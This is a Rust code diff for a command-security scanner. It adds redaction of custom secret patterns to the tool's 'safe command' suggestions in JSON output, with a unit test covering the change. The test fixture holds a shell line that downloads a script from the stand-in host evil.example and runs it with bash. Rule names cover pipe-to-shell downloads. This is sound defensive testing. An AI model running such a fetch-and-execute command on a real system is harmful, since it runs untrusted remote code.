@@ -51,9 +51,37 @@ pub struct JsonOutput<'a> {
     #[serde(skip_serializing_if = "Option::is_none")]
     pub urls_extracted_count: Option<usize>,
     /// Safer-command suggestions: a (possibly empty) array when the caller
-    /// passed `--suggest-safe-command`, omitted otherwise.
+    /// passed `--suggest-safe-command`, omitted otherwise. These are owned
+    /// redacted copies (not borrowed) because a suggestion's `safe_command`
+    /// can re-embed the original command/URL/path, so it must run through the
+    /// same `custom_patterns` redaction as `findings` before it is serialized.
+    /// See [`redact_suggestion`].
     #[serde(skip_serializing_if = "Option::is_none")]
-    pub safe_suggestions: Option<&'a [SafeSuggestion]>,
+    pub safe_suggestions: Option<Vec<SafeSuggestion>>,
+}
+
+/// Return a redacted clone of a [`SafeSuggestion`] for JSON output.
+///
+/// `safe_command` re-embeds the user's original command/URL/path (the
+/// pipe-to-shell, sudo-narrow, env-scrub, archive, and dotfile rewrites all
+/// splice attacker- or user-controlled input back in), and `rationale` is a
+/// per-rule string that some transforms (env-scrub) build with a runtime value.
+/// Both are therefore scrubbed with the SAME `custom_patterns` the caller uses
+/// for `findings`, via [`crate::redact::redact_with_custom`] (the exact
+/// primitive `redact_finding` applies to a finding's free-text fields).
+///
+/// `rule_id` (a fixed snake_case rule name) and `remediation` (static per-rule
+/// advice) are secret-free by construction and pass through unchanged.
+fn redact_suggestion(s: &SafeSuggestion, custom_patterns: &[String]) -> SafeSuggestion {
+    SafeSuggestion {
+        rule_id: s.rule_id.clone(),
+        safe_command: s
+            .safe_command
+            .as_deref()
+            .map(|c| crate::redact::redact_with_custom(c, custom_patterns)),
+        rationale: crate::redact::redact_with_custom(&s.rationale, custom_patterns),
+        remediation: s.remediation.clone(),
+    }
 }
 
 /// Write verdict as JSON to the given writer.
@@ -75,6 +103,15 @@ pub fn write_json_with_suggestions(
 ) -> std::io::Result<()> {
     let redacted_findings = crate::redact::redacted_findings(&verdict.findings, custom_patterns);
     let findings: Vec<FindingView> = redacted_findings.iter().map(FindingView::of).collect();
+    // A SafeSuggestion's `safe_command` re-embeds the original command/URL/path,
+    // so it would reintroduce exactly the secrets `custom_patterns` redacted out
+    // of `findings`. Redact each suggestion with the same patterns before it is
+    // serialized (see `redact_suggestion`).
+    let safe_suggestions = suggestions.map(|sugg| {
+        sugg.iter()
+            .map(|s| redact_suggestion(s, custom_patterns))
+            .collect::<Vec<_>>()
+    });
     let output = JsonOutput {
         schema_version: SCHEMA_VERSION,
         action: verdict.action,
@@ -86,7 +123,7 @@ pub fn write_json_with_suggestions(
         policy_path_used: &verdict.policy_path_used,
         timings_ms: &verdict.timings_ms,
         urls_extracted_count: verdict.urls_extracted_count,
-        safe_suggestions: suggestions,
+        safe_suggestions,
     };
     serde_json::to_writer(&mut w, &output)?;
     writeln!(w)?;
@@ -677,6 +714,62 @@ mod tests {
         let arr = v["safe_suggestions"].as_array().unwrap();
         assert_eq!(arr.len(), 1);
         assert_eq!(arr[0]["rule_id"], "plain_http_to_sink");
+    }
+
+    #[test]
+    fn write_json_with_suggestions_redacts_custom_pattern_in_safe_command() {
+        // A SafeSuggestion's `safe_command` re-embeds the original command/URL,
+        // so a secret the caller asked to redact via `custom_patterns` would be
+        // reintroduced verbatim into JSON unless the suggestion is redacted too.
+        // Build a suggestion whose rewrite carries the secret, then assert the
+        // raw secret never reaches the serialized output (only `[REDACTED:...]`),
+        // while the suggestion structure (rule_id + the safe_command key) stays.
+        let verdict = block_verdict_with_bypass();
+        let secret = "SECRET123";
+        let custom = vec![secret.to_string()];
+        let sugg = vec![SafeSuggestion {
+            rule_id: "curl_pipe_shell".to_string(),
+            // Mirrors what `rewrite_pipe_to_shell` emits: the original URL spliced
+            // back into the rewrite. Here the URL carries the custom-pattern token.
+            safe_command: Some(format!(
+                "curl -fsSL -o /tmp/tirith-review.sh 'https://evil.example/{secret}' && \
+                 less /tmp/tirith-review.sh && bash /tmp/tirith-review.sh"
+            )),
+            // Also plant it in the rationale (env-scrub builds this at runtime).
+            rationale: format!("downloads {secret} for review"),
+            remediation: "review before running".to_string(),
+        }];
+
+        let mut buf = Vec::new();
+        write_json_with_suggestions(&verdict, &custom, Some(&sugg), &mut buf).unwrap();
+        let raw = String::from_utf8(buf).unwrap();
+
+        // The raw secret must NOT survive anywhere in the serialized JSON.
+        assert!(
+            !raw.contains(secret),
+            "custom-pattern secret must be redacted out of safe_suggestions JSON: {raw}"
+        );
+        // The redaction marker proves the scrub ran (not that the field was dropped).
+        assert!(
+            raw.contains("[REDACTED:custom]"),
+            "redacted safe_command must carry the custom redaction marker: {raw}"
+        );
+
+        // The suggestion structure must remain intact: array present, with the
+        // rule_id and a (now-redacted) safe_command key still serialized.
+        let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
+        let arr = v["safe_suggestions"].as_array().unwrap();
+        assert_eq!(arr.len(), 1);
+        assert_eq!(arr[0]["rule_id"], "curl_pipe_shell");
+        let sc = arr[0]["safe_command"]
+            .as_str()
+            .expect("safe_command must still be present (redacted, not dropped)");
+        assert!(
+            !sc.contains(secret) && sc.contains("[REDACTED:custom]"),
+            "safe_command must be the redacted rewrite: {sc}"
+        );
+        // The static, secret-free fields pass through unchanged.
+        assert_eq!(arr[0]["remediation"], "review before running");
     }
 
     #[test]
